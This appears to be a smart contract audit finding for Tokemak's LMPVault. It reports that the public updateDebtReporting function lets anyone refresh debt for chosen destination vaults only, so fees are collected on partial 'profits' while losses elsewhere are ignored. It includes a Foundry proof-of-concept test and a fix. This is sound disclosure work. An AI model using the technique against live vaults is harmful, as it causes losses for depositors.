Nice Maroon Frog

medium

# Destination vault debt can be selectively updated to collect fees on "profits" while ignoring the losses from other destination vaults
## Summary

The `LMPVault.updateDebtReporting` function allows anyone to selectively update the debt of destination vaults, leading to a (temporarily) incomplete `totalDebt` (and `totalIdle`) value. This results in the collection of protocol fees, even though the `LMPVault` potentially has not made any profit, leading to a loss for the users (depositors) of the `LMPVault`.

## Vulnerability Detail

Protocol fees are collected on the `LMPVault`'s profits generated by its destination vaults. The profits are calculated based on the idle funds (`totalIdle`) and the total debt (`totalDebt`). The `totalDebt` and `totalIdle` values are updated whenever destination vaults are rebalanced or by manually calling the `updateDebtReporting` function. This function is publicly callable by anyone and expects an array of destination vaults to update the debt reporting.

As the caller can arbitrarily select which destination vaults to update the debt reporting for ([the vaults have to be valid](https://github.com/sherlock-audit/2023-06-tokemak/blob/main/v2-core-audit-2023-07-14/src/vault/LMPVault.sol#L762-L764)), the caller can purposefully and selectively update the debt reporting for destination vaults that have generated profits, while ignoring the losses from other destination vaults.

This will result in the collection of protocol fees, as it seems that the `LMPVault` made a profit. However, the destination vaults with losses are ignored and not accounted for in the `totalDebt`. Consequently, fees are collected even though the `LMPVault` potentially has not made any profit, leading to a loss for the users (depositors) of the `LMPVault`.

The following test case demonstrates how destination vaults can be purposefully and selectively updated to collect fees on "profits" while ignoring the losses from the other destination vaults:

<details>
  <summary><strong>Test case (click to reveal)</strong></summary>

```diff
diff --git a/v2-core-audit-2023-07-14/test/vault/LMPVault-Withdraw.t.sol b/v2-core-audit-2023-07-14/test/vault/LMPVault-Withdraw.t.sol
index 47b238e..f2d06b9 100644
--- a/v2-core-audit-2023-07-14/test/vault/LMPVault-Withdraw.t.sol
+++ b/v2-core-audit-2023-07-14/test/vault/LMPVault-Withdraw.t.sol
@@ -1047,6 +1047,77 @@ contract LMPVaultMintingTests is Test {
         assertEq(balAfter - balBefore, 900, "actual");
     }

+    function test_IncompleteUpdateDebtReporting() public {
+        _accessController.grantRole(Roles.SOLVER_ROLE, address(this));
+        _accessController.grantRole(Roles.LMP_FEE_SETTER_ROLE, address(this));
+
+        // Configure our fees and where they will go
+        address feeSink = vm.addr(1000);
+        _lmpVault.setFeeSink(feeSink);
+        vm.label(feeSink, "feeSink");
+        _lmpVault.setPerformanceFeeBps(1000); // 10%
+
+        // User is going to deposit 1000e18 assets
+        _asset.mint(address(this), 1000e18);
+        _asset.approve(address(_lmpVault), 1000e18);
+        _lmpVault.deposit(1000e18, address(this));
+
+        // Deployed 100e18 asset to DV1
+        _underlyerOne.mint(address(this), 100e18);
+        _underlyerOne.approve(address(_lmpVault), 100e18);
+        _lmpVault.rebalance(
+            address(_destVaultOne),
+            address(_underlyerOne), // tokenIn
+            100e18,
+            address(0), // destinationOut, none when sending out baseAsset
+            address(_asset), // baseAsset, tokenOut
+            200e18
+        );
+
+        // Deploy 800e18 asset to DV2
+        _underlyerTwo.mint(address(this), 800e18);
+        _underlyerTwo.approve(address(_lmpVault), 800e18);
+        _lmpVault.rebalance(
+            address(_destVaultTwo),
+            address(_underlyerTwo), // tokenIn
+            800e18,
+            address(0), // destinationOut, none when sending out baseAsset
+            address(_asset), // baseAsset, tokenOut
+            800e18
+        );
+
+        // Price of DV1 increased by 200% (was worth 2 ETH before)
+        _mockRootPrice(address(_underlyerOne), 4e18);
+
+        // Price of DV2 dropped by 25% (was worth 1 ETH before)
+        _mockRootPrice(address(_underlyerTwo), 7.5e17);
+
+        address[] memory destinationVaults = new address[](1);
+        destinationVaults[0] = address(_destVaultOne);
+
+        uint256 feeSinkBeforeBal = _lmpVault.balanceOf(feeSink);
+
+        /**
+         * Update only DV1
+         */
+        _lmpVault.updateDebtReporting(destinationVaults);
+
+        assertGt(_lmpVault.balanceOf(feeSink) - feeSinkBeforeBal, 0); // fees are collected
+        assertEq(_lmpVault.navPerShareHighMark(), 10_000 + 2_000); // increase
+
+        /**
+         * Now update DV2
+         */
+        destinationVaults[0] = address(_destVaultTwo);
+
+        uint256 feeSinkBeforeBal2 = _lmpVault.balanceOf(feeSink);
+
+        _lmpVault.updateDebtReporting(destinationVaults);
+
+        assertEq(_lmpVault.balanceOf(feeSink) - feeSinkBeforeBal2, 0); // no fees are collected
+        assertEq(_lmpVault.navPerShareHighMark(), 10_000 + 2_000); // remains unchanged
+    }
+
     function test_redeem_RevertIf_Paused() public {
         _asset.mint(address(this), 1000);
         _asset.approve(address(_lmpVault), 1000);

```

**How to run this test case:**

Save git diff to a file named `test.patch` and run with

```bash
git apply test.patch
forge test --match-test "test_IncompleteUpdateDebtReporting"
```

Result:

```bash
Running 1 test for test/vault/LMPVault-Withdraw.t.sol:LMPVaultMintingTests
[PASS] test_IncompleteUpdateDebtReporting() (gas: 1258076)
Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 5.91ms
Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

</details>

## Impact

Protocol fees are collected on a potentially incorrect and incomplete `totalDebt` (and `totalIdle`) value, leading to a loss for the users (depositors) of the `LMPVault`. This issue can be exploited by anyone who wants to cause a loss for the users of the `LMPVault`.

## Code Snippet

[src/vault/LMPVault.updateDebtReporting](https://github.com/sherlock-audit/2023-06-tokemak/blob/main/v2-core-audit-2023-07-14/src/vault/LMPVault.sol#L628-L630)

Anyone can call the `updateDebtReporting` function and selectively update the debt reporting for the given `_destinations` vaults.

```solidity
628: function updateDebtReporting(address[] calldata _destinations) external nonReentrant trackNavOps {
629:     _updateDebtReporting(_destinations);
630: }
```

## Tool used

Manual Review

## Recommendation

Consider updating the debt reporting for all destination vaults in one go, instead of selectively updating them one by one and then collecting fees.
